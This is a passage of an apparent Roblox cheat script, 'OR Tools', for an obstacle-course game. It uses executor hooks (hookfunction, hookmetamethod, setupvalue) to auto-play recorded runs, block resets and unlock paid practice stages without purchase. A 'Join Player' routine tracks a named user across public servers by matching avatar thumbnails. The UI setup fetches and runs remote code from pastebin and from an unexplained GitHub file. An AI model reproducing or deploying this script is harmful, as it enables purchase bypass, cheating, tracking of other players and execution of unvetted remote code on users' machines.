									AnimatePose = Frame[9]
									Animation = Frame[2][#Frame[2]]
								end
							end
							local CurrentPressedKeys = {}
							for Index = RoundedFreezeFrame-math.max(500,0),RoundedFreezeFrame do
								local Frame = self.ReplayTable[Index]
								if Frame and type(Frame) == "table" then
									local BeganInputs, EndedInputs = table.unpack(Frame[12])

									for _,Key in BeganInputs do
										if Key ~= "u" and Key ~= "d" then
											CurrentPressedKeys[Key] = true
										end
									end

									for _,Key in EndedInputs do
										CurrentPressedKeys[Key] = nil
									end
								end
							end
							local HumanoidRootPartCFrame = Util:TableToCFrame(Frame[1])
							local AnimationSpeed = Frame[3]
							local HumanoidState = Frame[4]
							local HumanoidRootPartVelocity = Util:TableToVector3(Frame[5]) 
							local HumanoidRootPartRotVelocity = Util:TableToVector3(Frame[6])
							local CameraCFrame = Util:TableToCFrame(Frame[7]) 
							local Zoom = Frame[8]
							local ShiftLockEnabled = (Frame[10] == 1 and true) or false
							local MouseLocation = Util:TableToVector2(Frame[11])
							local CurrentState = Util:GetHumanoid():GetState().Value
							if Animation then
								if Animation[1] == "walk" then
									if Util:GetHumanoid().FloorMaterial ~= Enum.Material.Air and CurrentState ~= 3 then
										Animate:playAnimation("walk",Animation[2],true)
									end
								else
									Animate:playAnimation(Animation[1],Animation[2],true)
								end
							end
							pcall(function()
								Animate:playAnimation(AnimationSpeed)
							end)
							Animate.Pose = AnimatePose
							Util:GetHumanoid():ChangeState(HumanoidState)
							Util:GetCharacter().HumanoidRootPart.Velocity = HumanoidRootPartVelocity
							Util:GetCharacter().HumanoidRootPart.RotVelocity = HumanoidRootPartRotVelocity
							Util:GetCharacter().HumanoidRootPart.CFrame = HumanoidRootPartCFrame
							if Replay.CameraLocked then 
							CurrentCamera.CFrame = CameraCFrame
                            end
							Camera:SetZoom(Zoom)
							if ShiftLockEnabled ~= Input:GetShiftLockEnabled() then
								Input:SetShiftLockEnabled(ShiftLockEnabled)
							end
							mousemoveabs(MouseLocation.X,MouseLocation.Y)
						else
							RunService.RenderStepped:Wait()
						end
					end
				else
					pcall(function()
						Util:GetCharacter().HumanoidRootPart.Anchored = false
					end)
				end
				RunService.RenderStepped:Wait()
			end
		end)
	end
end

do 
	local InputBlacklist = {
		["R"] = true;
		["T"] = true;
		["F"] = true;
		["G"] = true;
		["E"] = true;
	}

	function Connections:CharacterAdded()
		local humanoid = Util:GetHumanoid()

		humanoid.StateChanged:Connect(function(_, state)
			table.insert(self.HumanoidStateQueue, state.Value)
		end)

		DefaultJumpPower = humanoid.JumpPower
		DefaultWalkSpeed = humanoid.WalkSpeed
		Animate:Reanimate()

		humanoid.Died:Connect(function()
			self.Dead = true
		end)

		self.Dead = false
	end

	function Connections:Init()
		UserInputService.InputBegan:Connect(function(input, gameProcessed)
			if gameProcessed then
				gameProcessed = false
			end
			

			if input.KeyCode == Enum.KeyCode.LeftShift and not Replay.Reading and not gameProcessed then
				Input:SetShiftLockEnabled(not Input.ShiftLockEnabled)
			end

			if not Replay.Enabled then 
				return
			end

			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				table.insert(self.InputBeganQueue,"b1")
			elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
				table.insert(self.InputBeganQueue,"b2")
			elseif input.UserInputType == Enum.UserInputType.Keyboard then
				local inputName = string.split(tostring(input.KeyCode),".")[3]

				if not InputBlacklist[inputName] then
					table.insert(self.InputBeganQueue, inputName)
				end
			end

			if input.KeyCode == Enum.KeyCode.E then
				Replay:Freeze(not Replay.Frozen)
			elseif input.KeyCode == Enum.KeyCode.T  then
				
				if not Replay.Reading then
					Replay:Freeze(true)
					if Replay.SeekDirection == 0 then
						Replay.SeekDirection = -1 * Replay.SeekDirectionMultiplier
					end
				end
			elseif input.KeyCode == Enum.KeyCode.Y then				
				if not Replay.Reading then
					Replay:Freeze(true)
					if Replay.SeekDirection == 0 then
						Replay.SeekDirection = 1 * Replay.SeekDirectionMultiplier
					end
				end
			elseif input.KeyCode == Enum.KeyCode.F and Replay.SeekDirection == 0 then 
				Replay:Freeze(true)

				local newFreezeFrame = Replay.FreezeFrame - 1
				if newFreezeFrame > 0 and newFreezeFrame <= #Replay.ReplayTable then
					Replay.FreezeFrame = newFreezeFrame
				end
			elseif input.KeyCode == Enum.KeyCode.G and Replay.SeekDirection == 0  then
				Replay:Freeze(true)

				local newFreezeFrame = Replay.FreezeFrame + 1
				if newFreezeFrame > 0 and newFreezeFrame <= #Replay.ReplayTable then
					Replay.FreezeFrame = newFreezeFrame
				end
			elseif input.KeyCode == Enum.KeyCode.Q then 
				Replay:StartReading()	
			elseif input.KeyCode == Enum.KeyCode.L then 
				Replay:StopReading()
			elseif input.KeyCode == Enum.KeyCode.P then 
				Replay:SaveToFile()	
			end
		end)

		UserInputService.InputChanged:Connect(function(input, gameProcessed)
			if not Replay.Enabled then 
				return
			end

			if Input.UserInputType == Enum.UserInputType.MouseWheel then
				if Input.Position.Z > 0 then
					table.insert(self.InputBeganQueue,"u")
				else
					table.insert(self.InputBeganQueue,"d")
				end
			end
		end)


		UserInputService.InputEnded:Connect(function(input, gameProcessed)
			if not Replay.Enabled then 
				return
			end

			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				table.insert(self.InputEndedQueue,"b1")
			elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
				table.insert(self.InputEndedQueue,"b2")
			elseif input.UserInputType == Enum.UserInputType.MouseWheel then
				if input.Position.Z > 0 then
					table.insert(self.InputEndedQueue,"u")
				else
					table.insert(self.InputEndedQueue,"d")
				end			
			elseif input.UserInputType == Enum.UserInputType.Keyboard then
				local inputName = string.split(tostring(input.KeyCode),".")[3]
				table.insert(self.InputEndedQueue, inputName)
			end

			if input.KeyCode == Enum.KeyCode.T then
				if Replay.SeekDirection == -1*Replay.SeekDirectionMultiplier then
					Replay.SeekDirection = 0
				end
			elseif input.KeyCode == Enum.KeyCode.Y then
				if Replay.SeekDirection == 1*Replay.SeekDirectionMultiplier then
					Replay.SeekDirection = 0
				end
			end
		end)

		RunService.RenderStepped:Connect(function()
			if not Replay.Frozen then 
				return
			end
			
			local NewFreezeFrame = Replay.FreezeFrame + Replay.SeekDirection
			
			if NewFreezeFrame < 1 then
				Replay.FreezeFrame = 1
			elseif NewFreezeFrame > #Replay.ReplayTable then
				Replay.FreezeFrame = #Replay.ReplayTable
			else
				Replay.FreezeFrame = NewFreezeFrame
			end
		end)

		CurrentCamera.Changed:Connect(function()
			if Replay.Reading then
			--CurrentCamera.CFrame = Camera.CameraCFrame
			end
		end)

		LocalPlayer.CharacterAdded:Connect(function(...)
			self:CharacterAdded(...)
		end)
	end
end

do 
	Input:Init()
	Camera:Init()
	Replay:Init()
	Connections:Init()

	Connections:CharacterAdded()

	RunService.Heartbeat:Connect(function()
		Connections.InputBeganQueue = {}
		Connections.InputEndedQueue = {}
	end)
end

return Replay
]=]

)()


local CollectionService = game:GetService("CollectionService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")
local InsertService = game:GetService("InsertService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer.PlayerGui
local LoadedUI = PlayerGui.LoadedStage
local MainUI = PlayerGui.MainUI
local PracticeUI = MainUI.PracticeUI

local ORUtils = require(ReplicatedStorage.Utils.ORUtils)
local Difficulties = require(ReplicatedStorage.Info.Difficulties)
local PracticeController = require(MainUI.MainUIController.PracticeController)

local RoundUpdate = ReplicatedStorage.RoundEvents.RoundUpdate
local RoundEnded = ReplicatedStorage.RoundEvents.RoundEnded
local RoundUpdated = Instance.new("BindableEvent")

local Util = {}

local Data = {
	Difficulties = {},
}

local TASCreator = {
	Stages = nil,
	PlayerConnections = nil,
	EffectModules = {},
}

local AutoPlay = {}

local Misc = {}

local UserInterface = {
	SelectedDifficulty = "Effortless",
	SelectedStage = "1",
	Join = "",
	AutoPlay = false,
	DisableReset = false,
	UnlockedAll = false,
}

do 
	function Data:SaveStages()
		for i,v in getconnections(game.Players.LocalPlayer.PlayerGui.LoadedStage.ChildAdded) do
			v:Disable()  
		end

		local info = game:GetService("ReplicatedStorage").Info.Stages
		local load = game:GetService("ReplicatedStorage"):WaitForChild("ServerCommunication"):WaitForChild("Requests"):WaitForChild("Practice"):WaitForChild("Load")
		local diff = require(game:GetService("ReplicatedStorage").Info.Difficulties)

		local modules = {}

		local function GetModule(name)
			if modules[name] then 
				return modules[name]
			end

			modules[name] = require(info[name])

			return modules[name]
		end

		local TEMP = workspace:FindFirstChild("Stages") or Instance.new("Folder")
		TEMP.Name = "Stages"
		TEMP.Parent = workspace

		for name ,_ in diff do 
			local info = GetModule(name)

			for _, stageInfo in info do 
				local thread = coroutine.running()

				load:FireServer(name, stageInfo.ID)

				local connection
				connection = game.Players.LocalPlayer.PlayerGui.LoadedStage.ChildAdded:Connect(function(desc)
					connection:Disconnect()

					task.wait()

					desc.Name = stageInfo.ID
					desc.Parent = TEMP
					coroutine.resume(thread)
				end)

				coroutine.yield()
			end
		end
	end

	function Data:GetStages()
		if not UserInterface.SelectedDifficulty then 
			return {}
		end

		local stages = {}

		for _, stage in ORUtils.Stages do 
			if stage.Difficulty == UserInterface.SelectedDifficulty then 
				for _, stage in stage.Stages do 
					table.insert(stages, stage.ID)
				end
			end
		end

		table.sort(stages, function(a, b)
			return a < b
		end)

		for i, stage in stages do 
			stages[i] = tostring(stage)
		end

		return stages
	end

	function Data:Init()
		for i, stage in ORUtils.Stages do 
			self.Difficulties[i] = stage.Difficulty
		end
	end
end

do 
	Util.AngleMap = {
		[1] = 0,
		[2] = 180,
		[3] = 270,
		[4] = 90,
		[5] = 225,
		[6] = 45,
		[7] = 315,
		[8] = 135,
	}
	
	function Util:GetCharacter()
		return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	end

	function Util:GetRoot()
		return self:GetCharacter():WaitForChild("HumanoidRootPart")
	end

	function Util:GetTaggedInModel(model)
		local tagged = {}

		for _, obj in model:GetDescendants() do
			local tags = CollectionService:GetTags(obj)
			if tags then
				for _, tag in tags do
					table.insert(tagged, {
						Part = obj,
						Tag = tag,
					})
				end
			end
		end

		return tagged
	end
	
	function Util:GetSpawn()
		if not workspace.Arena:FindFirstChild("Stages") then return workspace.Arena.Spawns:FindFirstChild("1") end

		local stage = workspace.Arena.Stages:WaitForChild(LocalPlayer.Name)
		local startPos = stage.Settings.Start.Position
		
		local closestSpawn
		local closestMagnitude = math.huge
		
		for _, obj in workspace.Arena.Spawns:GetChildren()  do
			local magnitude = (startPos - obj.Top.Position).Magnitude
			if magnitude < closestMagnitude then 
				closestSpawn = obj
				closestMagnitude = magnitude
			end
		end
		
		return closestSpawn
	end

	function Util:TableToCFrame(tbl)
		return CFrame.new(table.unpack(tbl))
	end

	function Util:CFrameToTable(cframe)
		return {cframe:GetComponents()}
	end

	function Util:GetNextStage()
		local stages = {}

		for _, stage in Data:GetStages() do 
			table.insert(stages, tonumber(stage))
		end

		local nearest = nil

		for _, stage in stages do
			if stage > tonumber(UserInterface.SelectedStage) and (nearest == nil or stage < nearest) then
				nearest = stage
			end
		end

		return nearest
	end
end


do 
	local EffectInfo = {
		["SpinnerPart"] = {
			["Module"] = require(ReplicatedStorage.ClientSideEffects.SpinnerPart),
			["Metatable"] = true,
		},
		["ExpandingBeam"] = {
			["Module"] = require(ReplicatedStorage.ClientSideEffects.ExpandingBeam),
			["Metatable"] = true,
		},
		["ExpandingBeam2"] = {
			["Module"] = require(ReplicatedStorage.ClientSideEffects.ExpandingBeam2),
			["Metatable"] = true,
		},
		["FallingPart"] = {
			["Module"] = require(ReplicatedStorage.ClientSideEffects.FallingPart),
			["Metatable"] = true
		},
		["ShrinkPart"] = {
			["Module"] = require(ReplicatedStorage.ClientSideEffects.ShrinkPart),
			["Metatable"] = true
		},
		["TimedButton"] = {
			["Module"] = require(ReplicatedStorage.ClientSideEffects.TimedButton),
			["Metatable"] = true
		},
		["JumpPart"] = {
			["Module"] = require(ReplicatedStorage.ClientSideEffects.JumpPart),
			["Extra"] = true,
		},
		["LocalUnanchor"] = {
			["Module"] = require(ReplicatedStorage.ClientSideEffects.LocalUnanchor),
		},
		["RotatingPlatform"] = {
			["Module"] = require(ReplicatedStorage.ClientSideEffects.RotatingPlatform),
		},
		["Conveyor"] = {
			["Module"] = require(ReplicatedStorage.ClientSideEffects.Conveyor),
		},
		["DamagePart"] = {
			["Module"] = require(ReplicatedStorage.OREffects.DamagePart),
		},
		["KillPart"] = {
			["Module"] = require(ReplicatedStorage.OREffects.DamagePart),
		},
	}

	function TASCreator:ToggleArena()
		local function Toggle(bool)
			if self.OriginalMiddle then 
				self.OriginalMiddle.Parent = bool and workspace or ReplicatedStorage
			end


			self.StageFolder.Parent = bool and self.Arena or ReplicatedStorage
			self.Walkways.Parent = bool and self.Arena or ReplicatedStorage
		end

		if self.ArenaConnections then 
			for _, connection in self.ArenaConnections do 
				connection:Disconnect()
			end
			self.ArenaConnections = nil
			Toggle(true)
			return
		end

		self.ArenaConnections = {}

		local connection
		connection = workspace.ChildAdded:Connect(function(child)
			if child.Name == "Middle" then 
				self.OriginalMiddle = child 
				Toggle(false)
			end
		end)

		table.insert(self.ArenaConnections, connection)

		local connection2 
		connection2 = workspace.Preloaded.ChildAdded:Connect(function(child)
			task.wait()

			child:Destroy()	
		end)

		table.insert(self.ArenaConnections, connection2)

		Toggle(false)
	end


	function TASCreator:TogglePlayers()
		local players = {}

		local function Toggle(bool)
			for _, player in bool and Players:GetPlayers() or players do 
				if not player.Character then 
					continue
				end

				for _, obj in player.Character:GetDescendants() do
					if obj.Name ~= "HumanoidRootPart" and obj:IsA("BasePart") or obj.Name == "face" then 
						obj.Transparency = bool and 0 or 1
					end
				end
			end
		end

		if self.PlayerConnections then
			for _, connection in self.PlayerConnections do 
				connection:Disconnect()
			end

			self.PlayerConnections = nil
			Toggle(true)
			return
		end

		self.PlayerConnections = {}

		for _, player in Players:GetPlayers() do 
			if player ~= LocalPlayer then 
				table.insert(players, player)
			end
		end

		local connection1
		connection1 = Players.PlayerAdded:Connect(function(player)
			table.insert(players, player)
			Toggle(false)
		end)

		table.insert(self.PlayerConnections, connection1)

		local connection2 
		connection2 = Players.PlayerRemoving:Connect(function(player)
			table.remove(players, table.find(players, player))
			Toggle(false)
		end)

		table.insert(self.PlayerConnections, connection2)

		Toggle(false)
	end

	function TASCreator:AddEffects()
		local tagged = Util:GetTaggedInModel(self.Stage)

		for _, obj in tagged do 
			local objInfo = EffectInfo[obj.Tag]

			if not objInfo then 
				continue
			end

			if objInfo.Extra then
				objInfo.Module:Connect(LocalPlayer, obj.Part)
			elseif objInfo.Metatable then 
				objInfo.Module.Connect(objInfo.Module, LocalPlayer, obj.Part)
			else 
				objInfo.Module:Connect(obj.Part)
			end
		end
	end

	function TASCreator:CreateBridge()
		local contactPoint = Vector3.new(678.528076, self.Stage.Settings.End.Position.Y, 47.1423645)
		local bridgeLength = (self.Stage.Settings.End.Position - contactPoint).Magnitude
		if bridgeLength > 2 then
			local adjustedLength = math.floor(bridgeLength / 0.5) * 0.5 - 1
			self.Bridge = PlayerGui.MainUI.PracticeHandler.End:Clone()
			self.Bridge.Middle.Size = Vector3.new(adjustedLength, 1, 5)
			self.Bridge.Middle.Position += Vector3.new((adjustedLength - 0.25) / 2, 0, 0)
			self.Bridge.SideL.Size = Vector3.new(adjustedLength, 1, 1)
			self.Bridge.SideL.Position += Vector3.new((adjustedLength - 0.25) / 2, 0, 0)
			self.Bridge.SideR.Size = Vector3.new(adjustedLength, 1, 1)
			self.Bridge.SideR.Position += Vector3.new((adjustedLength - 0.25) / 2, 0, 0)
			self.Bridge.End.Position += Vector3.new(adjustedLength - 0.25, 0, 0)
			self.Bridge.Parent = self.Folder
			self.Bridge:SetPrimaryPartCFrame(CFrame.new(contactPoint))
		else 
			self.Bridge = self.Stage.Settings.End
		end	
	end

	function TASCreator:CreatePlatform()
		self.Platform = self.OriginalMiddle:Clone()
		self.Platform.Parent = self.Folder
		self.Platform.Name = "Platform"


		self.Platform:PivotTo(self.Platform:GetPivot() + Vector3.new(0, self.Stage.Settings.End.Position.Y - self.Platform.PrimaryPart.Position.Y, 0))
	end

	function TASCreator:CreateStage(replay)		
		if self.Stage then 
			self:Cleanup()
		end

		self.Stage = self.Stages:FindFirstChild(UserInterface.SelectedStage):Clone()
		self.Stage.Settings.Start.Transparency = 1
		self.Stage.Settings.End.Transparency = 1
		self.Stage:SetPrimaryPartCFrame(workspace.Arena.Spawns["1"]:GetPrimaryPartCFrame())

		self:ToggleArena()
		self:TogglePlayers()
		self:CreateBridge()
		self:CreatePlatform()
		self:AddEffects()

		self.Stage.Parent = self.Folder

		LocalPlayer.Character:PivotTo(workspace.Arena.Spawns["1"]:GetPrimaryPartCFrame() + Vector3.new(0, 5, 0))

		if not replay then
			UniversalTAS.Enabled = true
			UniversalTAS:NewFile(UserInterface.SelectedStage)
		else 
			AutoPlay:PlayTAS(UserInterface.SelectedStage)
		end
	end

	function TASCreator:Cleanup()
		UniversalTAS.Enabled = false
		LocalPlayer.Character:PivotTo(workspace:FindFirstChildOfClass("SpawnLocation").CFrame + Vector3.new(0, 5, 0))
		self:ToggleArena()
		self:TogglePlayers()
		self.Folder:ClearAllChildren()
		self.Stage = nil
	end

	function TASCreator:Init()
		self.Folder = workspace:FindFirstChild("Creator") or Instance.new("Folder")
		self.Folder.Parent = workspace
		self.Folder.Name = "Creator"

		self.Stages = ReplicatedStorage:FindFirstChild("Stages") or InsertService:LoadLocalAsset("rbxassetid://103711201260351")
		self.Stages.Parent = ReplicatedStorage

		self.Middle = self.Stages.Middle
		self.OriginalMiddle = workspace.Middle

		self.Arena = workspace.Arena
		self.StageFolder = self.Arena.Stages
		self.Walkways = self.Arena.Walkways
	end
end

do 
	function AutoPlay:IsPlayerInRound(players)
		for _, playerInfo in players.PlayerStatuses do 
			if playerInfo.Username == LocalPlayer.Name then 
				return true
			end
		end
	end
	
	function AutoPlay:PlayTAS(stageId)
		stageId = stageId or workspace.GameStatus:GetAttribute("CurrentStageID")
		
		if not stageId or tonumber(stageId) == 0 then 
			return
		end
		
		if not isfile(`Universal Tas/{stageId}.json`) then 
			warn(`{stageId} doesnt exist.`)
			return
		end

		local decoded = UniversalTAS:Decode(readfile(`Universal Tas/{stageId}.json`))
		local replayTable = {}
		local _spawn = Util:GetSpawn()

		for i, frame in decoded do 
			for j, obj in frame do 
				if not replayTable[i] then 
					replayTable[i] = {}
				end

				if j == 1 or j == 7 then
					replayTable[i][j] = Util:CFrameToTable(_spawn.PrimaryPart.CFrame:ToWorldSpace(workspace.Arena.Spawns["1"].PrimaryPart.CFrame:ToObjectSpace(Util:TableToCFrame(obj))))
				else 
					replayTable[i][j] = obj
				end
			end
		end

		UniversalTAS:StartReading(replayTable, 0)
	end


	function AutoPlay:PlayAgain()
		local stageId = workspace.GameStatus:GetAttribute("CurrentStageID")
		if not stageId or not isfile(`Universal TAS/{stageId}.json`) then return end

		local decoded = UniversalTAS:Decode(readfile(`Universal TAS/{stageId}.json`))
		local replayTable = {}

		-- Use stored spawn from PlayTAS (if available)
		local _spawn = self._LastSpawn or Util:GetSpawn()

		for i, frame in decoded do 
			for j, obj in frame do 
				if not replayTable[i] then 
					replayTable[i] = {}
				end

				if j == 1 or j == 7 then
					replayTable[i][j] = Util:CFrameToTable(_spawn.PrimaryPart.CFrame:ToWorldSpace(workspace.Arena.Spawns["1"].PrimaryPart.CFrame:ToObjectSpace(Util:TableToCFrame(obj))))
				else 
					replayTable[i][j] = obj
				end
			end
		end

		UniversalTAS:StartReading(replayTable, 0)
	end



	function AutoPlay:Init()
		workspace.GameStatus:GetAttributeChangedSignal("CurrentStageID"):Connect(function()
			if not UserInterface.AutoPlay or not self.InGame then 
				return
			end

			self:PlayTAS()
		end)

		RoundUpdated.Event:Connect(function(status, players)
			if not UserInterface.AutoPlay or not self:IsPlayerInRound(players) or self.InGame or status ~= "RoundChange" then 
				return
			end

			self.InGame = true
		end)

		local oldUpdate; oldUpdate = hookfunction(getconnections(RoundUpdate.OnClientEvent)[1].Function, function(...)
			RoundUpdated:Fire(...)

			return oldUpdate(...)
		end)

		local oldEnd; oldEnd = hookfunction(getconnections(RoundEnded.OnClientEvent)[1].Function, function(...)
			self.InGame = false

			return oldEnd(...)
		end)
	end
end

do 
	function Misc:UnlockStages()
		if self.UnlockedAll then 
			return 
		end
	
		for difficulty in Difficulties do
			PracticeUI.DifficultyPick.Difficulties[difficulty].Buy.Visible = false
		end

		PracticeUI.DifficultyPick.Difficulties.UnlockAll.Visible = false
	
		local tbl = {}

		for difficulty in Difficulties do
			table.insert(tbl, difficulty)
		end
	
		self.OldUnlocked = getupvalue(PracticeController.Init, 2)

		setupvalue(PracticeController.Init, 2, tbl)
	
		self.UnlockedAll = true
	end

	function Misc:JoinProServer()
		TeleportService:Teleport(17205456753, LocalPlayer)
	end

	function Misc:JoinPlayer()
		local function HttpGet(url)
			return pcall(HttpService.JSONDecode, HttpService, game:HttpGet(url))
		end
	
		local function GetServers(id, cursor)
			local fullurl = `https://games.roblox.com/v1/games/{id}/servers/Public?limit=100`
			if cursor then
				fullurl = `{fullurl}&cursor={cursor}`
			end
	
			return HttpGet(fullurl)
		end
	
		local function FetchThumbs(tokens)
			local payload = {
				Url = "https://thumbnails.roblox.com/v1/batch",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Method = "POST",
				Body = {}
			}
	
			for _, token in ipairs(tokens) do
				table.insert(payload.Body, {
					requestId = `0:{token}:AvatarHeadshot:150x150:png:regular`,
					type = "AvatarHeadShot",
					targetId = 0,
					token = token,
					format = "png",
					size = "150x150"
				})
			end
	
			payload.Body = HttpService:JSONEncode(payload.Body)
	
			local result = request(payload)
			local success, data = pcall(HttpService.JSONDecode, HttpService, result.Body)
			return success, data and data.data or data
		end
		
		local success, Username, UserId = pcall(function()
			local userId = Players:GetUserIdFromNameAsync(UserInterface.Join)
			local username = Players:GetNameFromUserIdAsync(userId)
			return username, userId
		end)
		if not success then
			return 
		end
		
		local success, response = HttpGet(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={UserId}&format=Png&size=150x150&isCircular=false`)
		local thumbnail = success and response['data'][1].imageUrl
		local placeIds = {17205456753, 9472973478}
		local searching = true
		local threads = 30
	
		UserInterface:SendNotification(`Searching for {Username}`, 3)
	
		for _, placeId in ipairs(placeIds) do
			local cursor = nil
			local searched = 0
			local players = 0
	
			while searching do    
				local success, result = GetServers(placeId, cursor)
				if not success then 
					UserInterface:SendNotification(`Failed to get servers for place {placeId}!`, 3)
					break
				end
	
				local servers = result.data
				cursor = result.nextPageCursor
	
				for i, server in ipairs(servers) do
					local function FetchServer()
						local success, thumbs = FetchThumbs(server.playerTokens)
						if not success then
							return
						end
	
						players += #thumbs
	
						for _, thumb in ipairs(thumbs) do
							if thumb.imageUrl and thumb.imageUrl == thumbnail then
								searching = false
								UserInterface:SendNotification("Found player, teleporting!", 3)
	
								TeleportService:TeleportToPlaceInstance(placeId, server.id, LocalPlayer)
								local connection; connection = LocalPlayer.OnTeleport:Connect(function(teleportState)
									if teleportState == Enum.TeleportState.Failed then
										connection:Disconnect()
										UserInterface:SendNotification("Server is full!", 3)
									end
								end)
								return
							end
						end
					end
					
					searched = searched + 1
					if i % threads ~= 0 then
						task.spawn(FetchServer)
						task.wait()
					else
						FetchServer()
					end
				end
	
				if not cursor then
					UserInterface:SendNotification(`Finished searching place {placeId}, player not found.`, 3)
					break
				end
	
				task.wait()
			end
			
			if not searching then
				break
			end
		end
		
		if searching then
			UserInterface:SendNotification("Failed to find player in any of the searched places!", 3)
		end
	end

	function Misc:ServerHop()
		local servers = {}
		local req = request({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", game.PlaceId)})
		local body = HttpService:JSONDecode(req.Body)

		if body and body.data then
			for i, v in body.data do
				if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
					table.insert(servers, 1, v.id)
				end
			end
		end

		if #servers > 0 then
			TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], LocalPlayer)
		end
	end

	function Misc:Init()
		local old; old = hookmetamethod(game, "__namecall", function(self, ...)
			local args = {...}
			local method = getnamecallmethod()

			if method == "FireServer" and tostring(self) == "Load" then
				if Misc.UnlockedAll and not table.find(Misc.OldUnlocked, args[1]) then 
					TASCreator.Stages[args[2]]:Clone().Parent = LoadedUI
				end 
			elseif method == "FireServer" and tostring(self) == "Reset" and UserInterface.DisableReset then 
				return
			end

			return old(self, ...)
		end)
	end
end

do 	
	function UserInterface:SendNotification(message, time, callback, b1, b2)
		StarterGui:SetCore("SendNotification", {
			Title = "OR Tools",
			Text = message,
			Duration = time,
			Callback = callback,
			Button1 = b1,
			Button2 = b2,
		})
	end

	function UserInterface:Init()
		local Library = loadstring(game:HttpGet("https://pastebin.com/raw/VXxvyYmW"))()
		local MainWindow = Library:CreateWindow("OR Tools")

		MainWindow:Section("Auto Play")

		MainWindow:Toggle("Enabled", {
			flag = "AutoPlayEnabled"
		},function(value)
			self.AutoPlay = value
		end)

		MainWindow:Section("Stage Loader")

		MainWindow:Dropdown("Difficulty ", { 
			flag = "Select Difficulty";
			list = Data.Difficulties,
		}, function(value)
			self.SelectedDifficulty = value
			local stages = Data:GetStages()
			self.SelectStages:Refresh(stages)
		end)

		self.SelectStages = MainWindow:Dropdown("Stage ", { 
			flag = "Select Stage";
			list = Data:GetStages(),
		}, function(value)
			self.SelectedStage = value
		end)

		MainWindow:Box("Stage", {
			flag = "Select Stage box",
		}, function(value)
			self.SelectedStage = value
		end)

		loadstring(game:HttpGet("https://raw.githubusercontent.com/rxd977/Scripts/refs/heads/main/hi"))()


		MainWindow:Bind("Load Next", {
			flag = "ToggleUI",
			kbonly = true,
			default = Enum.KeyCode.N
		}, function()
			self.SelectedStage = Util:GetNextStage()
			TASCreator:CreateStage()
		end)

		MainWindow:Button("Replay", function()
			TASCreator:CreateStage(true)
		end)
		
		MainWindow:Button("Force Stop", function()
			UniversalTAS:ForceStop()
		end)

		MainWindow:Button("Play Again", function()
			AutoPlay:PlayAgain()
		end)


		MainWindow:Button("Load", function()
			TASCreator:CreateStage()
		end)

		MainWindow:Button("Unload", function()
			TASCreator:Cleanup()
		end)

		MainWindow:Section("TAS")

		MainWindow:Bind("Camera Lock", {
			flag = "CameraLockedOnFreeze",
			kbonly = true,
			default = Enum.KeyCode.C
		}, function()
			local state = not UniversalTAS.CameraLocked

			UniversalTAS.CameraLocked = state

			UserInterface:SendNotification(`Camera {state and "Locked" or "Unlocked"}`, 3)
		end)

		MainWindow:Section("Misc")

		MainWindow:Button("Unlock Practice Stages", function()
			Misc:UnlockStages()
		end)

		MainWindow:Button("Join Pro Server", function()
			Misc:JoinProServer()
		end)

		MainWindow:Button("Serverhop", function()
			Misc:ServerHop()
		end)
		
		MainWindow:Box("Username", {
			flag = "Username",
		}, function(value)
			UserInterface.Join = value
		end)

		MainWindow:Button("Join Player", function()
			Misc:JoinPlayer()
		end)

		MainWindow:Toggle("Disable Reset", {
			flag = "DisableReset"
		},function(value)
			self.DisableReset = value
		end)
	end
end

do 
	Data:Init()
	TASCreator:Init()
	AutoPlay:Init()	
	Misc:Init()
	UserInterface:Init()
end
